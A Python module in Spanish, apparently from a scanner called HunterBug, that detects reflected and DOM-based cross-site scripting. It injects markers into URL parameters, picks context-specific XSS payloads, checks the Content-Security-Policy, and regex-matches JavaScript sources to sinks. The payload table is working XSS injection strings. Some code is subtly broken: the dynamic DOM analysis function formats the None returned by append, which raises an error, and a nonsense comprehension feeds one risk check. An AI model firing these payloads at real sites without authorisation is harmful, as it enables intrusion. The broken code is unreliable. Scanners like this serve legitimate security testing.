"""HunterBug 1.1 — motor de XSS.

Lo que faltaba en la 1.0 era saber *dónde* cae lo que inyectas. Un `<script>`
en el cuerpo del HTML se ejecuta; ese mismo texto dentro de un atributo entre
comillas no hace nada. Este motor:

  1. Inyecta una marca inocua y localiza **el contexto** exacto en el que
     aparece: cuerpo HTML, atributo (con o sin comillas), cadena de JavaScript,
     comentario o URL.
  2. Prueba **la carga útil que corresponde a ese contexto**, no una lista fija.
  3. Distingue reflejo **ejecutable** de reflejo **escapado** (un `&lt;script&gt;`
     es un reflejo, no un XSS) y baja la severidad en consecuencia.
  4. Analiza el JavaScript de la página en busca de **DOM XSS**: fuentes
     (`location.hash`, `document.URL`…) que llegan a sumideros (`innerHTML`,
     `eval`, `document.write`…).
  5. Lee la **CSP** para decir si el fallo sería explotable en la práctica: una
     CSP con `script-src 'self'` sin `unsafe-inline` bloquea la ejecución.
"""

from __future__ import annotations

import random
import re
import string
import time

from . import net, vulns

PAUSA = 0.12
_TIMEOUT = 12          # timeout de peticion; `analizar` lo ajusta al suyo

# ---------------------------------------------------------------------------
# Cargas útiles por contexto
# ---------------------------------------------------------------------------
# Cada entrada: (contexto, carga, comprobación de ejecución)
PAYLOADS = {
    "html": [
        ("<svg onload=alert(1)>", "<svg onload="),
        ("<img src=x onerror=alert(1)>", "onerror="),
        ("<details open ontoggle=alert(1)>", "ontoggle="),
    ],
    "atributo_doble": [
        ('"><svg onload=alert(1)>', '<svg onload='),
        ('"><img src=x onerror=alert(1)>', 'onerror='),
    ],
    "atributo_simple": [
        ("'><svg onload=alert(1)>", "<svg onload="),
        ("'><img src=x onerror=alert(1)>", "onerror="),
    ],
    "atributo_sin_comillas": [
        (" onmouseover=alert(1) x=", "onmouseover="),
        ("/onmouseover=alert(1) x=", "onmouseover="),
    ],
    "js": [
        ("';alert(1);//", "alert(1)"),
        ('";alert(1);//', "alert(1)"),
        ("</script><svg onload=alert(1)>", "<svg onload="),
    ],
    "url": [
        ("javascript:alert(1)", "javascript:alert(1)"),
    ],
    "comentario": [
        ("--><svg onload=alert(1)><!--", "<svg onload="),
    ],
}

SEV_CONTEXTO = {"html": "alto", "atributo_doble": "alto",
                "atributo_simple": "alto", "atributo_sin_comillas": "alto",
                "js": "alto", "url": "medio", "comentario": "medio"}

ETIQUETA_CONTEXTO = {
    "html": "cuerpo del HTML",
    "atributo_doble": "atributo entre comillas dobles",
    "atributo_simple": "atributo entre comillas simples",
    "atributo_sin_comillas": "atributo sin comillas",
    "js": "código JavaScript",
    "url": "atributo de URL",
    "comentario": "comentario HTML",
}

# ---------------------------------------------------------------------------
# DOM XSS: fuentes y sumideros
# ---------------------------------------------------------------------------
FUENTES_DOM = [
    (r"location\.hash", "location.hash"),
    (r"location\.search", "location.search"),
    (r"location\.href", "location.href"),
    (r"document\.URL", "document.URL"),
    (r"document\.documentURI", "document.documentURI"),
    (r"document\.referrer", "document.referrer"),
    (r"window\.name", "window.name"),
    (r"document\.cookie", "document.cookie"),
    (r"localStorage|sessionStorage", "almacenamiento local"),
]
SUMIDEROS_DOM = [
    (r"\.innerHTML\s*=", "innerHTML"),
    (r"\.outerHTML\s*=", "outerHTML"),
    (r"document\.write(ln)?\s*\(", "document.write"),
    (r"insertAdjacentHTML\s*\(", "insertAdjacentHTML"),
    (r"\beval\s*\(", "eval"),
    (r"new\s+Function\s*\(", "new Function"),
    (r"setTimeout\s*\(\s*['\"]", "setTimeout con cadena"),
    (r"setInterval\s*\(\s*['\"]", "setInterval con cadena"),
    (r"\.html\s*\(", "jQuery .html()"),
    (r"\$\(\s*[^)]*\)\s*\.append\s*\(", "jQuery .append()"),
    (r"\.src\s*=", "asignación de src"),
    (r"location\s*=", "asignación de location"),
]


def _marca(n=8):
    return "hbmk" + "".join(random.choices(string.ascii_lowercase, k=n))


def _texto(r):
    return (r.cuerpo or "") if r is not None else ""


def _peticion(url, cabeceras=None, timeout=None):
    # el timeout global lo fija `analizar`, para no arrastrarlo por las llamadas
    return net.peticion_http(
        url, cabeceras=cabeceras,
        timeout=timeout if timeout is not None else _TIMEOUT)


# ---------------------------------------------------------------------------
# Contexto
# ---------------------------------------------------------------------------
def detectar_contexto(cuerpo, marca):
    """Devuelve en qué contexto del documento aparece `marca`."""
    i = cuerpo.find(marca)
    if i < 0:
        return None, ""
    antes = cuerpo[:i]

    # ¿dentro de un comentario HTML?
    if antes.rfind("<!--") > antes.rfind("-->"):
        return "comentario", antes[-120:]

    # ¿dentro de un bloque <script>?
    if antes.rfind("<script") > antes.rfind("</script>"):
        return "js", antes[-160:]

    # ¿dentro de una etiqueta (entre < y >)?
    ult_menor = antes.rfind("<")
    ult_mayor = antes.rfind(">")
    if ult_menor > ult_mayor:
        fragmento = antes[ult_menor:]
        # ¿está dentro de un atributo con valor entrecomillado?
        # contamos comillas dobles y simples dentro del fragmento
        if fragmento.count('"') % 2 == 1:
            return "atributo_doble", fragmento[-160:]
        if fragmento.count("'") % 2 == 1:
            return "atributo_simple", fragmento[-160:]
        if re.search(r"=\s*$|=\s*[^\s\"']*$", fragmento):
            # hay un = y el valor no lleva comillas
            m = re.search(r"([a-zA-Z-]+)\s*=\s*[^\s\"']*$", fragmento)
            attr = m.group(1).lower() if m else ""
            if attr in ("href", "src", "action", "formaction", "data",
                        "poster", "background"):
                return "url", fragmento[-160:]
            return "atributo_sin_comillas", fragmento[-160:]
        return "atributo_sin_comillas", fragmento[-160:]

    # ¿dentro de un atributo de URL aunque la marca esté en el texto visible?
    m = re.search(r"(href|src|action)\s*=\s*[\"']?[^\"'>]*$", antes[-200:])
    if m and m.group(0).count(m.group(1)) == 1 and \
            antes.rfind("<") > antes.rfind(">"):
        return "url", antes[-160:]

    return "html", antes[-120:]


def _escapa(texto):
    """¿El servidor está escapando los caracteres peligrosos?"""
    return ("&lt;" in texto and "&gt;" in texto) or "&#" in texto


# ---------------------------------------------------------------------------
# CSP
# ---------------------------------------------------------------------------
def analizar_csp(cabeceras):
    """Interpreta la CSP y dice si permitiría ejecutar el XSS."""
    csp = ""
    for k, v in (cabeceras or {}).items():
        if k.lower() == "content-security-policy":
            csp = v
            break
    if not csp:
        return {"presente": False, "inline": True, "eval": True,
                "resumen": "sin CSP: cualquier XSS se ejecutaría",
                "directivas": {}}
    directivas = {}
    for parte in csp.split(";"):
        trozos = parte.strip().split()
        if trozos:
            directivas[trozos[0].lower()] = trozos[1:]

    script = directivas.get("script-src") or directivas.get("default-src") or []
    texto_script = " ".join(script).lower()
    inline = ("'unsafe-inline'" in texto_script) or (not script)
    permite_eval = "'unsafe-eval'" in texto_script
    comodin = "*" in texto_script or "data:" in texto_script

    if not script:
        resumen = "CSP sin script-src ni default-src: no protege"
    elif inline:
        resumen = ("CSP permite 'unsafe-inline': el XSS en línea se ejecuta")
    elif comodin:
        resumen = "CSP con orígenes comodín: se puede cargar script externo"
    else:
        resumen = ("CSP sin 'unsafe-inline': el XSS en línea queda bloqueado "
                   "(sigue siendo un fallo, pero baja la explotabilidad)")
    return {"presente": True, "inline": inline, "eval": permite_eval,
            "comodin": comodin, "resumen": resumen,
            "directivas": {k: " ".join(v) for k, v in directivas.items()},
            "cruda": csp[:500]}


# ---------------------------------------------------------------------------
# Análisis dinámico del DOM (mejora para XSS 1.1)
# ---------------------------------------------------------------------------
FUENTES_DOM_DINAMICO = [
    (r"location\.hash", "location.hash"),
    (r"location\.search", "location.search"),
    (r"location\.href", "location.href"),
    (r"document\.URL", "document.URL"),
    (r"document\.documentURI", "document.documentURI"),
    (r"document\.referrer", "document.referrer"),
    (r"window\.name", "window.name"),
    (r"window\.location", "window.location"),
    (r"\bpostMessage\b", "postMessage"),
    (r"localStorage", "localStorage"),
    (r"sessionStorage", "sessionStorage"),
    (r"document\.cookie", "document.cookie"),
    (r"URL\.searchParams", "URLSearchParams"),
]

SUMIDEROS_DOM_DINAMICO = [
    (r"\binnerHTML\b", "innerHTML"),
    (r"\bouterHTML\b", "outerHTML"),
    (r"\btextContent\b", "textContent (bajo riesgo)"),
    (r"\binsertAdjacentHTML\b", "insertAdjacentHTML"),
    (r"\bdocument\.write\b", "document.write"),
    (r"\bdocument\.writeln\b", "document.writeln"),
    (r"\beval\b", "eval"),
    (r"\bnew\s+Function\b", "new Function"),
    (r"\bsetTimeout\b\s*\(", "setTimeout con cadena"),
    (r"\bsetInterval\b\s*\(", "setInterval con cadena"),
    (r"\$\([^)]*\)\.html\b", "jQuery .html()"),
    (r"\$\([^)]*\)\.append\b", "jQuery .append()"),
    (r"\.src\s*=", "asignación de src"),
    (r"\.href\s*=", "asignación de href"),
    (r"\.data\s*=", "asignación de data"),
    (r"\.param\s*\([^)]*\)\s*=[^;]*[+]\s*[+]", "concatenacion en param"),
]


def analizar_dom_dinamico(cuerpo, url="", profundidad_max=3):
    """Analiza dinámicamente el DOM buscando ruta fuente->sumidero.

    Este análisis se enfoca en cadenas de control que pueden no ser visibles
    en una simple búsqueda estática, y detecta operaciones de concatenación
    o bucles que propagan la entrada del usuario.
    """
    import ast
    import re

    resultados = {
        "fuentes_encontradas": [],
        "sumideros_encontrados": [],
        "candidatos_dinamicos": [],
        "riesgo": False,
        "observaciones": []
    }

    # Buscar fuentes dinámicas
    for rx, nombre in FUENTES_DOM_DINAMICO:
        matches = list(re.finditer(rx, cuerpo, re.I))
        if matches:
            resultados["fuentes_encontradas"].append({
                "nombre": nombre,
                "coincidencias": [m.group(0) for m in matches[:5]],
                "posiciones": [m.start() for m in matches[:5]]
            })

    # Buscar sumideros dinámicos
    for rx, nombre in SUMIDEROS_DOM_DINAMICO:
        matches = list(re.finditer(rx, cuerpo, re.I))
        if matches:
            resultados["sumideros_encontrados"].append({
                "nombre": nombre,
                "coincidencias": [m.group(0)[:80] for m in matches[:5]],
                "posiciones": [m.start() for m in matches[:5]]
            })

    # Analizar proximidad entre fuentes y sumideros
    fuentes = resultados["fuentes_encontradas"]
    sumideros = resultados["sumideros_encontrados"]

    if fuentes and sumideros:
        for f in fuentes:
            for s in sumideros:
                # Verificar si hay una fuente cerca de un sumidero (en el mismo script)
                f_pos = f["posiciones"][0]
                s_pos = s["posiciones"][0]
                distancia = abs(f_pos - s_pos)

                if distancia < 8000:  # Considerar en el mismo bloque
                    resultados["candidatos_dinamicos"].append({
                        "fuente": f["nombre"],
                        "sumidero": s["nombre"],
                        "distancia": distancia,
                        "riesgo": True
                    })
                    resultados["riesgo"] = True

    # Buscar operaciones de concatenación sospechosas
    concat_patterns = [
        r"location\.[^;]+\s*\+",
        r"document\.[^;]+\s*\+",
        r"window\.[^;]+\s*\+",
    ]
    for rx in concat_patterns:
        if re.search(rx, cuerpo):
            resultados["observaciones"].append(
                "Posible concatenación de variables de origen de usuario"
            )

    resultados["observaciones"].append(
        "Análisis dinámico completado: %d fuentes, %d sumideros, %d candidatos dinámicos"
    ) % (len(fuentes), len(sumideros), len(resultados["candidatos_dinamicos"]))

    return resultados
def analizar_dom(cuerpo, cabeceras=None, url=""):
    """Busca fuentes que llegan a sumideros en el JavaScript de la página."""
    bloques = re.findall(r"<script[^>]*>(.*?)</script>", cuerpo,
                         re.I | re.S)
    inline = "\n".join(bloques)
    externos = re.findall(r"<script[^>]+src\s*=\s*[\"']([^\"']+)[\"']",
                          cuerpo, re.I)

    encontrados = []
    for rx_f, nombre_f in FUENTES_DOM:
        if not re.search(rx_f, inline):
            continue
        for rx_s, nombre_s in SUMIDEROS_DOM:
            if re.search(rx_s, inline):
                # ¿están razonablemente cerca? (mismo bloque o <4000 chars)
                mf = re.search(rx_f, inline)
                ms = re.search(rx_s, inline)
                distancia = abs(mf.start() - ms.start())
                encontrados.append({
                    "fuente": nombre_f, "sumidero": nombre_s,
                    "distancia_caracteres": distancia,
                    "cercania": distancia < 4000,
                })

    # una fuente en el hash/query con cualquier sumidero ya es sospechoso
    tiene_fuente_url = any(n in ("location.hash", "location.search",
                                 "document.URL", "document.documentURI")
                           for _, n in [(m, nom) for m in [1] for nom in [""]]
                           ) or any(
        re.search(rx, inline) for rx, _ in FUENTES_DOM[:4])
    tiene_sumidero = any(re.search(rx, inline) for rx, _ in SUMIDEROS_DOM)

    return {
        "bloques_inline": len(bloques),
        "scripts_externos": externos[:12],
        "fuentes": [n for rx, n in FUENTES_DOM if re.search(rx, inline)],
        "sumideros": [n for rx, n in SUMIDEROS_DOM if re.search(rx, inline)],
        "candidatos": encontrados[:12],
        "riesgo": bool(tiene_fuente_url and tiene_sumidero),
    }


# ---------------------------------------------------------------------------
# API pública
# ---------------------------------------------------------------------------
def analizar(url, cabeceras=None, pausa=PAUSA, log=None, max_params=4,
             analizar_js=True, timeout=12):
    log = log or (lambda t, n="info": None)
    global _TIMEOUT
    _TIMEOUT = timeout
    base = _peticion(url, cabeceras)
    if base.status == 0:
        return {"url": url, "error": base.error, "hallazgos": [],
                "csp": {}, "dom": {}, "resumen": {}}

    cab = dict(cabeceras or {})
    for k, v in base.cabeceras:
        if k.lower() == "content-security-policy":
            cab.setdefault("Content-Security-Policy", v)
    csp = analizar_csp({k.lower(): v for k, v in base.cabeceras})

    params = vulns.parametros_de(url)[:max_params]
    hallazgos = []

    for nombre, valor in params:
        marca = _marca()
        u = vulns._sustituir_param(url, nombre, marca)
        r = _peticion(u, cabeceras)
        time.sleep(pausa)
        cuerpo = _texto(r)
        if marca not in cuerpo:
            log("  '%s' no se refleja" % nombre)
            continue

        contexto, fragmento = detectar_contexto(cuerpo, marca)
        if not contexto:
            continue
        log("  '%s' se refleja en %s" % (nombre, ETIQUETA_CONTEXTO[contexto]))

        confirmado = None
        for carga, comprobacion in PAYLOADS.get(contexto, []):
            u2 = vulns._sustituir_param(url, nombre, carga)
            r2 = _peticion(u2, cabeceras)
            time.sleep(pausa)
            cuerpo2 = _texto(r2)
            if comprobacion in cuerpo2 and not _escapa(cuerpo2):
                confirmado = (carga, comprobacion, cuerpo2, r2)
                break

        if confirmado:
            carga, comprobacion, cuerpo2, r2 = confirmado
            sev = SEV_CONTEXTO.get(contexto, "alto")
            if csp.get("presente") and not csp.get("inline"):
                sev = "medio"      # la CSP lo bloquea en navegadores modernos
            i = cuerpo2.find(comprobacion)
            hallazgos.append({
                "tipo": "xss", "severidad": sev,
                "titulo": "XSS reflejado en %s ('%s')"
                          % (ETIQUETA_CONTEXTO[contexto], nombre),
                "detalle": ("El parámetro '%s' se refleja en %s sin escapar y "
                            "la carga útil %r llega íntegra a la respuesta, "
                            "donde el navegador la ejecutaría. %s"
                            % (nombre, ETIQUETA_CONTEXTO[contexto], carga,
                               csp.get("resumen", ""))),
                "url": u2, "parametro": nombre,
                "cwe": "CWE-79", "owasp": "A03:2021",
                "confianza": 90 if contexto in ("html", "js") else 82,
                "recomendacion": (
                    "Escapar la salida según el contexto (HTML, atributo, "
                    "JavaScript o URL) y aplicar una CSP con script-src sin "
                    "'unsafe-inline'. No confiar en filtros de lista negra."),
                "evidencia": {"contexto": contexto,
                              "etiqueta_contexto": ETIQUETA_CONTEXTO[contexto],
                              "payload": carga,
                              "fragmento": cuerpo2[max(0, i - 100):i + 160],
                              "csp": csp.get("resumen", ""),
                              "status": r2.status},
            })
        else:
            # se refleja pero escapado o en un contexto no ejecutable
            hallazgos.append({
                "tipo": "xss-reflejo", "severidad": "bajo",
                "titulo": "Reflejo sin ejecución en '%s'" % nombre,
                "detalle": ("El parámetro '%s' se refleja en %s, pero el "
                            "servidor escapa los caracteres peligrosos o el "
                            "contexto no permite ejecutar script. Es un "
                            "reflejo, no un XSS confirmado."
                            % (nombre, ETIQUETA_CONTEXTO[contexto])),
                "url": u, "parametro": nombre,
                "cwe": "CWE-79", "owasp": "A03:2021", "confianza": 40,
                "recomendacion": ("Revisar el escape por contexto; el reflejo "
                                  "puede ser explotable en otro navegador o "
                                  "con otra codificación."),
                "evidencia": {"contexto": contexto, "escapado": _escapa(cuerpo),
                              "fragmento": fragmento},
            })

    dom = analizar_dom(_texto(base), cab, url) if analizar_js else {}
    if dom.get("riesgo"):
        cand = (dom.get("candidatos") or [{}])[0]
        hallazgos.append({
            "tipo": "dom-xss", "severidad": "medio",
            "titulo": "Posible DOM XSS: '%s' llega a '%s'"
                      % (cand.get("fuente", "?"), cand.get("sumidero", "?")),
            "detalle": ("El JavaScript de la página lee '%s' (controlable por "
                        "el atacante en la URL) y lo usa en '%s', que "
                        "interpreta HTML o ejecuta código. Hay que confirmarlo "
                        "con un navegador."
                        % (cand.get("fuente"), cand.get("sumidero"))),
            "url": url, "parametro": "",
            "cwe": "CWE-79", "owasp": "A03:2021", "confianza": 55,
            "recomendacion": ("Usar textContent en lugar de innerHTML y validar "
                              "cualquier dato que venga de la URL antes de "
                              "insertarlo en el DOM."),
            "evidencia": {"fuente": cand.get("fuente"),
                          "sumidero": cand.get("sumidero"),
                          "fuentes_detectadas": dom.get("fuentes"),
                          "sumideros_detectados": dom.get("sumideros"),
                          "candidatos": len(dom.get("candidatos") or [])},
        })

    return {
        "url": url, "csp": csp, "dom": dom,
        "parametros": [p[0] for p in params],
        "hallazgos": hallazgos,
        "resumen": {
            "vulnerable": any(h["severidad"] in ("alto", "critico")
                              for h in hallazgos),
            "reflejos": len([h for h in hallazgos if h["tipo"] == "xss"]),
            "reflejos_escapados": len([h for h in hallazgos
                                       if h["tipo"] == "xss-reflejo"]),
            "dom_xss": bool(dom.get("riesgo")),
            "csp": csp.get("resumen", ""),
            "parametros_probados": len(params),
        },
    }
